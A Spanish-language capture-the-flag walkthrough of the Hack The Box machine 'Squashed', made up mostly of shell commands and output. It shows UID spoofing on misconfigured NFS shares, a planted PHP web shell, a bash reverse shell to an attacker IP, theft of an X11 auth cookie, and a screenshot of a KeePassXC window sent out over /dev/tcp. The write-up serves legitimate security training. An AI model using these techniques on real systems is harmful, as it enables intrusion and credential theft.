---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Squashed

`Squashed` es una máquina Linux de dificultad fácil que combina la identificación y el aprovechamiento de configuraciones incorrectas en recursos compartidos NFS mediante la suplantación de identidad de usuarios. Además, la máquina incorpora la enumeración de una pantalla X11 en la escalada de privilegios al hacer que el atacante tome una captura de pantalla del escritorio actual.

<figure><img src="../../.gitbook/assets/Squashed.png" alt="" width="563"><figcaption></figcaption></figure>

***



```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.191 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 00:09 CET
Initiating SYN Stealth Scan at 00:09
Scanning 10.10.11.191 [65535 ports]
Discovered open port 22/tcp on 10.10.11.191
Discovered open port 80/tcp on 10.10.11.191
Discovered open port 111/tcp on 10.10.11.191
Discovered open port 33955/tcp on 10.10.11.191
Discovered open port 34057/tcp on 10.10.11.191
Discovered open port 44139/tcp on 10.10.11.191
Discovered open port 2049/tcp on 10.10.11.191
Discovered open port 38665/tcp on 10.10.11.191
Completed SYN Stealth Scan at 00:09, 12.28s elapsed (65535 total ports)
Nmap scan report for 10.10.11.191
Host is up, received user-set (0.057s latency).
Scanned at 2025-02-16 00:09:29 CET for 12s
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
33955/tcp open  unknown syn-ack ttl 63
34057/tcp open  unknown syn-ack ttl 63
38665/tcp open  unknown syn-ack ttl 63
44139/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.41 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65541 (2.622MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.191
	[*] Open ports: 22,80,111,2049,33955,34057,38665,44139

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,80,111,2049,33955,34057,38665,44139 10.10.11.191 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 00:10 CET
Nmap scan report for 10.10.11.191
Host is up (0.053s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Built Better
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34057/tcp   mountd
|   100005  1,2,3      40001/udp   mountd
|   100005  1,2,3      47047/tcp6  mountd
|   100005  1,2,3      52258/udp6  mountd
|   100021  1,3,4      33955/tcp   nlockmgr
|   100021  1,3,4      35190/udp6  nlockmgr
|   100021  1,3,4      43807/tcp6  nlockmgr
|   100021  1,3,4      52430/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
33955/tcp open  nlockmgr 1-4 (RPC #100021)
34057/tcp open  mountd   1-3 (RPC #100005)
38665/tcp open  mountd   1-3 (RPC #100005)
44139/tcp open  mountd   1-3 (RPC #100005)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   89.58 ms 10.10.16.1
2   30.74 ms 10.10.11.191

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.56 seconds
```



```bash
❯ xsltproc targetedXML > index.html
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/5000_vmware_LFORxYKTup.png" alt=""><figcaption></figcaption></figure>



```bash
❯ whatweb http://10.10.11.191
http://10.10.11.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.191], JQuery[3.0.0], Script, Title[Built Better], X-UA-Compatible[IE=edge]
```



<figure><img src="../../.gitbook/assets/imagen (378).png" alt=""><figcaption></figcaption></figure>



```bash
❯ dirsearch -u 'http://10.10.11.191' -t 50 -i 200 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Squashed/Squashed/reports/http_10.10.11.191/_25-02-16_00-12-11.txt

Target: http://10.10.11.191/

[00:12:11] Starting: 
[00:12:37] 200 -  778B  - /images/
[00:12:39] 200 -  572B  - /js/

Task Completed
```



{% embed url="https://book.hacktricks.wiki/es/network-services-pentesting/pentesting-rpcbind.html" %}



```bash
❯ rpcinfo 10.10.11.191
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100005    1    udp       0.0.0.0.162.66         mountd     superuser
    100005    1    tcp       0.0.0.0.151.9          mountd     superuser
    100005    1    udp6      ::.172.180             mountd     superuser
    100005    1    tcp6      ::.153.47              mountd     superuser
    100005    2    udp       0.0.0.0.164.88         mountd     superuser
    100005    2    tcp       0.0.0.0.172.107        mountd     superuser
    100005    2    udp6      ::.164.127             mountd     superuser
    100005    2    tcp6      ::.195.185             mountd     superuser
    100005    3    udp       0.0.0.0.156.65         mountd     superuser
    100005    3    tcp       0.0.0.0.133.9          mountd     superuser
    100005    3    udp6      ::.204.34              mountd     superuser
    100005    3    tcp6      ::.183.199             mountd     superuser
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
    100003    3    udp       0.0.0.0.8.1            nfs        superuser
    100227    3    udp       0.0.0.0.8.1            nfs_acl    superuser
    100003    3    tcp6      ::.8.1                 nfs        superuser
    100003    4    tcp6      ::.8.1                 nfs        superuser
    100227    3    tcp6      ::.8.1                 nfs_acl    superuser
    100003    3    udp6      ::.8.1                 nfs        superuser
    100227    3    udp6      ::.8.1                 nfs_acl    superuser
    100021    1    udp       0.0.0.0.204.206        nlockmgr   superuser
    100021    3    udp       0.0.0.0.204.206        nlockmgr   superuser
    100021    4    udp       0.0.0.0.204.206        nlockmgr   superuser
    100021    1    tcp       0.0.0.0.132.163        nlockmgr   superuser
    100021    3    tcp       0.0.0.0.132.163        nlockmgr   superuser
    100021    4    tcp       0.0.0.0.132.163        nlockmgr   superuser
    100021    1    udp6      ::.137.118             nlockmgr   superuser
    100021    3    udp6      ::.137.118             nlockmgr   superuser
    100021    4    udp6      ::.137.118             nlockmgr   superuser
    100021    1    tcp6      ::.171.31              nlockmgr   superuser
    100021    3    tcp6      ::.171.31              nlockmgr   superuser
    100021    4    tcp6      ::.171.31              nlockmgr   superuser
```



```bash
❯ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```



```bash
❯ sudo mkdir -p /mnt/ross /mnt/html
❯ ls -l
drwxr-xr-x root root 4.0 KB Sun Feb 16 00:14:51 2025  html
drwxr-xr-x root root 4.0 KB Sun Feb 16 00:14:51 2025  ross
```



```bash
❯ sudo mount -t nfs 10.10.11.191:/home/ross /mnt/ross
❯ ls -l /mnt/ross
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Desktop
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Documents
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022 󰉍 Downloads
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022 󱍙 Music
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022 󰉏 Pictures
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Public
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Templates
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Videos
❯ sudo mount -t nfs 10.10.11.191:/var/www/html /mnt/html
❯ ls -l /mnt/html
lsd: /mnt/html/index.html: Permission denied (os error 13).

lsd: /mnt/html/images: Permission denied (os error 13).

lsd: /mnt/html/css: Permission denied (os error 13).

lsd: /mnt/html/js: Permission denied (os error 13).
```



tmb

```bash
❯ sudo mount -o vers=3,nolock 10.10.11.191:/var/www/html /mnt/html
❯ sudo mount -o vers=3,nolock 10.10.11.191:/home/ross /mnt/ross
```



```bash
❯ pwd
/mnt/ross
❯ tree -a
.
├── .bash_history -> /dev/null
├── .cache  [error opening dir]
├── .config  [error opening dir]
├── Desktop
├── Documents
│   └── Passwords.kdbx
├── Downloads
├── .gnupg  [error opening dir]
├── .local  [error opening dir]
├── Music
├── Pictures
├── Public
├── Templates
├── Videos
├── .viminfo -> /dev/null
├── .Xauthority
├── .xsession-errors
└── .xsession-errors.old

13 directories, 6 files
```



```bash
❯ pwd
/mnt/ross/Documents
❯ ls -la
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  .
drwxr-xr-x 1001 1001 4.0 KB Sun Feb 16 00:09:04 2025  ..
.rw-rw-r-- 1001 1001 1.3 KB Wed Oct 19 14:57:43 2022  Passwords.kdbx
```





```bash
❯ pwd
/mnt/ross
❯ ls -la
drwxr-xr-x 1001 1001 4.0 KB Sun Feb 16 00:09:04 2025  .
drwxr-xr-x kali kali 4.0 KB Sun Feb 16 00:25:12 2025  ..
drwx------ 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022 󰃨 .cache
drwx------ 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  .config
drwx------ 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022 󰢬 .gnupg
drwx------ 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  .local
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Desktop
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Documents
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022 󰉍 Downloads
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022 󱍙 Music
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022 󰉏 Pictures
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Public
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Templates
drwxr-xr-x 1001 1001 4.0 KB Fri Oct 21 16:57:01 2022  Videos
lrwxrwxrwx root root   9 B  Thu Oct 20 15:24:01 2022  .bash_history ⇒ /dev/null
lrwxrwxrwx root root   9 B  Fri Oct 21 15:07:10 2022  .viminfo ⇒ /dev/null
.rw------- 1001 1001  57 B  Sun Feb 16 00:09:04 2025  .Xauthority
.rw------- 1001 1001 2.4 KB Sun Feb 16 00:09:05 2025  .xsession-errors
.rw------- 1001 1001 2.4 KB Tue Dec 27 16:33:41 2022 󰁯 .xsession-errors.old
```



```bash
❯ xxd .Xauthority
xxd: .Xauthority: Permission denied
```



```bash
❯ sudo useradd gzzcoo
❯ sudo su gzzcoo -c bash
gzzcoo@kali:/mnt/ross$ ls -l
total 32
drwxr-xr-x 2 gzzcoo gzzcoo 4096 oct 21  2022 Desktop
drwxr-xr-x 2 gzzcoo gzzcoo 4096 oct 21  2022 Documents
drwxr-xr-x 2 gzzcoo gzzcoo 4096 oct 21  2022 Downloads
drwxr-xr-x 2 gzzcoo gzzcoo 4096 oct 21  2022 Music
drwxr-xr-x 2 gzzcoo gzzcoo 4096 oct 21  2022 Pictures
drwxr-xr-x 2 gzzcoo gzzcoo 4096 oct 21  2022 Public
drwxr-xr-x 2 gzzcoo gzzcoo 4096 oct 21  2022 Templates
drwxr-xr-x 2 gzzcoo gzzcoo 4096 oct 21  2022 Videos
gzzcoo@kali:/mnt/ross$ xxd .Xauthority 
00000000: 0100 000c 7371 7561 7368 6564 2e68 7462  ....squashed.htb
00000010: 0001 3000 124d 4954 2d4d 4147 4943 2d43  ..0..MIT-MAGIC-C
00000020: 4f4f 4b49 452d 3100 1059 3341 81a6 39b1  OOKIE-1..Y3A..9.
00000030: c20f c710 ee86 eb84 a5                   .........
gzzcoo@kali:/mnt/ross$ 
```



```bash
❯ find /mnt/html -ls
   133456      4 drwxr-xr--   5 2017     www-data     4096 feb 16 00:30 /mnt/html
find: ‘/mnt/html/index.html’: Permiso denegado
find: ‘/mnt/html/images’: Permiso denegado
find: ‘/mnt/html/css’: Permiso denegado
find: ‘/mnt/html/js’: Permiso denegado
```



```bash
❯ sudo usermod -u 2017 gzzcoo
❯ sudo su gzzcoo -c bash
gzzcoo@kali:/mnt$ ls -l html/
total 44
drwxr-xr-x 2 gzzcoo www-data  4096 feb 16 00:30 css
drwxr-xr-x 2 gzzcoo www-data  4096 feb 16 00:30 images
-rw-r----- 1 gzzcoo www-data 32532 feb 16 00:30 index.html
drwxr-xr-x 2 gzzcoo www-data  4096 feb 16 00:30 js
```



```bash
gzzcoo@kali:/mnt/html$ echo 'gzzcoo was here' > gzzcoo.txt
gzzcoo@kali:/mnt/html$ ls -l gzzcoo.txt 
-rw-rw-r-- 1 gzzcoo gzzcoo 16 feb 16  2025 gzzcoo.txt
```



```bash
❯ curl -s 'http://10.10.11.191/gzzcoo.txt'
gzzcoo was here
```



```bash
gzzcoo@kali:/mnt/html$ echo '<?php echo "gzzcoo was here";?>' > gzzcoo.php
gzzcoo@kali:/mnt/html$ ls -l gzzcoo.php 
-rw-rw-r-- 1 gzzcoo gzzcoo 32 feb 16  2025 gzzcoo.php
```



```bash
❯ curl -s 'http://10.10.11.191/gzzcoo.php'
gzzcoo was here
```



```bash
gzzcoo@kali:/mnt/html$ echo '<?php system($_GET["cmd"]);?>' > gzzcoo.php
gzzcoo@kali:/mnt/html$ ls -l gzzcoo.php 
-rw-rw-r-- 1 gzzcoo gzzcoo 30 feb 16  2025 gzzcoo.php
```



```bash
❯ curl -s 'http://10.10.11.191/gzzcoo.php?cmd=id'
uid=2017(alex) gid=2017(alex) groups=2017(alex)
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
❯ curl -s 'http://10.10.11.191/gzzcoo.php?cmd=/bin/bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/10.10.16.3/443%200>%261"'
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.191] 41772
bash: cannot set terminal process group (1072): Inappropriate ioctl for device
bash: no job control in this shell
alex@squashed:/var/www/html$ cat /home/alex/user.txt
8e4fcac31e3952a109c7cebe1999f784
```



```bash
alex@squashed:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
alex@squashed:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
                              
...[snip]...

alex@squashed:/var/www/html$ export TERM=xterm
alex@squashed:/var/www/html$ export SHELL=bash
alex@squashed:/var/www/html$ stty rows 46 columns 230
```



```bash
alex@squashed:/home/alex$ id
uid=2017(alex) gid=2017(alex) groups=2017(alex)
alex@squashed:/home/alex$ sudo -l
[sudo] password for alex:
```



```bash
alex@squashed:/home/ross$ ls -la
total 68
drwxr-xr-x 14 ross ross 4096 Feb 15 23:09 .
drwxr-xr-x  4 root root 4096 Oct 21  2022 ..
-rw-------  1 ross ross   57 Feb 15 23:09 .Xauthority
```



{% embed url="https://book.hacktricks.wiki/es/network-services-pentesting/6000-pentesting-x11.html?highlight=xaut#enumeration" %}



<figure><img src="../../.gitbook/assets/imagen (379).png" alt=""><figcaption></figcaption></figure>



```basic
alex@squashed:/home/ross$ w
 23:43:24 up 34 min,  1 user,  load average: 0.01, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               23:09   34:35   3.61s  0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
```



```bash
alex@squashed:/home/ross$ xdpyinfo -display :0
No protocol specified
xdpyinfo:  unable to open display ":0".
alex@squashed:/home/ross$ xwininfo -root -tree -display :0
No protocol specified
xwininfo: error: unable to open display ":0"
```





{% embed url="https://stackoverflow.com/questions/37157097/how-does-x11-authorization-work-mit-magic-cookie/37367518#37367518" %}

<figure><img src="../../.gitbook/assets/imagen (380).png" alt=""><figcaption></figcaption></figure>



```bash
alex@squashed:/home/ross$ cat .Xauthority 
cat: .Xauthority: Permission denied
```



```bash
gzzcoo@kali:/mnt/ross$ ls -l .Xauthority 
-rw------- 1 gzzcoo gzzcoo 57 feb 16 00:09 .Xauthority
gzzcoo@kali:/mnt/ross$ cat .Xauthority | base64
AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABBZM0GBpjmxwg/HEO6G64Sl
```



```bash
alex@squashed:/tmp$ echo 'AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABBZM0GBpjmxwg/HEO6G64Sl' | base64 -d > /tmp/.Xauthority
alex@squashed:/tmp$ ls -l .Xauthority 
-rw-r--r-- 1 alex alex 57 Feb 15 23:48 .Xauthority
alex@squashed:/tmp$ xxd .Xauthority 
00000000: 0100 000c 7371 7561 7368 6564 2e68 7462  ....squashed.htb
00000010: 0001 3000 124d 4954 2d4d 4147 4943 2d43  ..0..MIT-MAGIC-C
00000020: 4f4f 4b49 452d 3100 1059 3341 81a6 39b1  OOKIE-1..Y3A..9.
00000030: c20f c710 ee86 eb84 a5                   .........
```



```bash
alex@squashed:/home/ross$ export XAUTHORITY=/tmp/.Xauthority
alex@squashed:/home/ross$ env
SHELL=bash
PWD=/home/ross
XAUTHORITY=/tmp/.Xauthority
```



```bash
alex@squashed:/tmp$ xwininfo -root -tree -display :0

xwininfo: Window id: 0x533 (the root window) (has no name)

  Root window id: 0x533 (the root window) (has no name)
  Parent window id: 0x0 (none)
     26 children:
     0x80000b "gnome-shell": ("gnome-shell" "Gnome-shell")  1x1+-200+-200  +-200+-200
        1 child:
        0x80000c (has no name): ()  1x1+-1+-1  +-201+-201
     0x800022 (has no name): ()  802x575+-1+26  +-1+26
        1 child:
        0x1e00006 "Passwords - KeePassXC": ("keepassxc" "keepassxc")  800x536+1+38  +0+64
           1 child:
           0x1e000fe "Qt NET_WM User Time Window": ()  1x1+-1+-1  +-1+63
     0x1e00008 "Qt Client Leader Window": ()  1x1+0+0  +0+0
     0x800017 (has no name): ()  1x1+-1+-1  +-1+-1
     0x2000001 "keepassxc": ("keepassxc" "Keepassxc")  10x10+10+10  +10+10
     0x1e00004 "Qt Selection Owner for keepassxc": ()  3x3+0+0  +0+0
     0x1800001 "evolution-alarm-notify": ("evolution-alarm-notify" "Evolution-alarm-notify")  10x10+10+10  +10+10
     0x1a00002 (has no name): ()  10x10+0+0  +0+0
     0x1600001 "gsd-wacom": ("gsd-wacom" "Gsd-wacom")  10x10+10+10  +10+10
     0x1c00001 "gsd-media-keys": ("gsd-media-keys" "Gsd-media-keys")  10x10+10+10  +10+10
     0x1a00001 "gsd-xsettings": ("gsd-xsettings" "Gsd-xsettings")  10x10+10+10  +10+10
     0x1200001 "gsd-keyboard": ("gsd-keyboard" "Gsd-keyboard")  10x10+10+10  +10+10
     0x1400001 "gsd-color": ("gsd-color" "Gsd-color")  10x10+10+10  +10+10
     0x1000001 "gsd-power": ("gsd-power" "Gsd-power")  10x10+10+10  +10+10
     0xe00003 "ibus-xim": ()  1x1+0+0  +0+0
        1 child:
        0xe00004 (has no name): ()  1x1+-1+-1  +-1+-1
     0xe00001 "ibus-x11": ("ibus-x11" "Ibus-x11")  10x10+10+10  +10+10
     0xa00001 "ibus-extension-gtk3": ("ibus-extension-gtk3" "Ibus-extension-gtk3")  10x10+10+10  +10+10
     0x800011 (has no name): ()  1x1+-100+-100  +-100+-100
     0x80000f (has no name): ()  1x1+-1+-1  +-1+-1
     0x800009 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800008 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800007 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800006 "GNOME Shell": ()  1x1+-100+-100  +-100+-100
     0x800001 "gnome-shell": ("gnome-shell" "Gnome-shell")  10x10+10+10  +10+10
     0x600008 (has no name): ()  1x1+-100+-100  +-100+-100
     0x800010 "mutter guard window": ()  800x600+0+0  +0+0
```



```bash
alex@squashed:/tmp$ xwd -root -screen -silent -display :0 > screenshot.xwd
alex@squashed:/tmp$ ls -l screenshot.xwd 
-rw-r--r-- 1 alex alex 1923179 Feb 15 23:49 screenshot.xwd
```



```bash
❯ nc -nlvp 443 > screenshot.xwd
listening on [any] 443 ...
```



```bash
alex@squashed:/tmp$ cat screenshot.xwd > /dev/tcp/10.10.16.3/443
```



```bash
❯ ls -l screenshot.xwd
.rw-rw-r-- kali kali 1.8 MB Sun Feb 16 00:50:04 2025  screenshot.xwd
❯ file screenshot.xwd
screenshot.xwd: X-Window screen dump image data, version X11, "xwdump", 800x600x24, 256 colors 256 entries
❯ convert screenshot.xwd screenshot.png
❯ file screenshot.png
screenshot.png: PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced
❯ open screenshot.png
```



<figure><img src="../../.gitbook/assets/imagen (381).png" alt=""><figcaption></figcaption></figure>



```bash
alex@squashed:/tmp$ su root
Password: 
root@squashed:/tmp# cat /root/root.txt 
b75b0297bc839edcf61a7ad625e7ddfd
```
